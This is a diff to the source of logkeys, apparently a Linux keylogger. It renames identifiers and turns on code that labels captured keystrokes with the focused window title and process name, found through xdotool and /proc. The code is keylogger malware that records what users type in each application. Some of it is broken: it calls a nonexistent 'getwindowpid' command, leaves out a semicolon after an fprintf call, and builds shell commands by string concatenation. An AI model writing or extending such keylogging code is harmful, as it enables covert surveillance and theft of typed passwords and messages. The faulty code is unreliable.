@@ -65,7 +65,7 @@
 
 namespace logkeys {
 ////added made myself
-std::string getCurrentWindowName()
+std::string get_current_window_name()
 {
     Display *display;
   Window focus;
@@ -83,13 +83,12 @@ std::string getCurrentWindowName()
 
     return "{"+result+"}";
 }
-bool is_number(const std::string& s)
+bool check_if_number(const std::string& s)
 {
     std::string::const_iterator it = s.begin();
     while (it != s.end() && std::isdigit(*it)) ++it;
     return !s.empty() && it == s.end();
 }
-
 
 // executes cmd and returns string ouput
 std::string execute(const char* cmd)
@@ -519,14 +518,14 @@ int main(int argc, char **argv)
   strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));*/
   fflush(out);
 
-  ////added myself
-  /*std::string curprocessname = "";
-  std::string curwindowname = "";
-  std::string programname = "";
-  std::string oldwid = "";
-  std::string wid= "";
-  bool windowchanged = false;
-  bool firststart = true;*/
+  ////various strings to store the window name 
+  std::string curr_process_name, 
+    cur_window_name, 
+    program_name, 
+    old_window_id, 
+    window_id;
+  bool window_changed = false, 
+    first_start = true;
   
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
   while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
@@ -603,22 +602,23 @@ int main(int argc, char **argv)
     // on key press
     if (event.value == EV_MAKE) {
       ////added
-      if (!firststart) {
-        wid = execute("getwindowpid $(xdotool getwindowfocus)");
-        if (isnumber(wid))
-          curprocessname = execute("tr -d '\n' < /proc/"+wid+"/comm"); //update curprocessname
+      if (!first_start) {
+        window_id = execute("getwindowpid $(xdotool getwindowfocus)");
+        if (check_if_number(window_id))  ////better 
+          curr_process_name = execute("tr -d '\n' < /proc/"+window_id+"/comm"); //update curr_process_name
         else
-          curprocessname = "unknown pid";
+          curr_process_name = "unknown pid"; ////is this even possible
       }
-      if (!firststart && (wid != oldwid)) {
-        curwindowname = getCurrentWindowName();
-        programname = "["+curprocessname+"]"+curwindowname+ " > ";
-        windowchanged = true;
+      if (!first_start && (window_id != old_window_id)) {
+        cur_window_name = get_current_window_name();
+        program_name = "["+curr_process_name+"]"+cur_window_name+ " > ";
+        window_changed = true;
       }
       else
-        windowchanged = false;
-      if (windowchanged)
-        inc_size += fprintf(stdout, "%s%s", timestamp, programname.c_str());  // then newline and timestamp 
+        window_changed = false;
+
+      if (window_changed)
+        inc_size += fprintf(stdout, "%s%s", timestamp, program_name.c_str());  // then newline and timestamp 
       
       // on ENTER key or Ctrl+C/Ctrl+D event append timestamp
       if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
@@ -626,10 +626,10 @@ int main(int argc, char **argv)
         if (ctrl_in_effect)
           inc_size += fprintf(out, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
         if (args.flags & FLAG_NO_TIMESTAMPS)
-          inc_size += fprintf(out, "%s\n", programname.c_str())
+          inc_size += fprintf(out, "%s\n", program_name.c_str())
         else {
           strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
-          inc_size += fprintf(out, "%s%s", timestamp, programname.c_str());  // then newline and timestamp 
+          inc_size += fprintf(out, "%s%s", timestamp, program_name.c_str());  // then newline and timestamp 
         }
         if (inc_size > 0) file_size += inc_size;
         continue;  // but don't log "<Enter>"
@@ -674,8 +674,8 @@ int main(int argc, char **argv)
       }
       else inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
       ////added
-      firststart = false;
-      oldwid = wid;
+      first_start = false;
+      old_window_id = window_id;
     } // if (EV_MAKE)
     
     // on key release
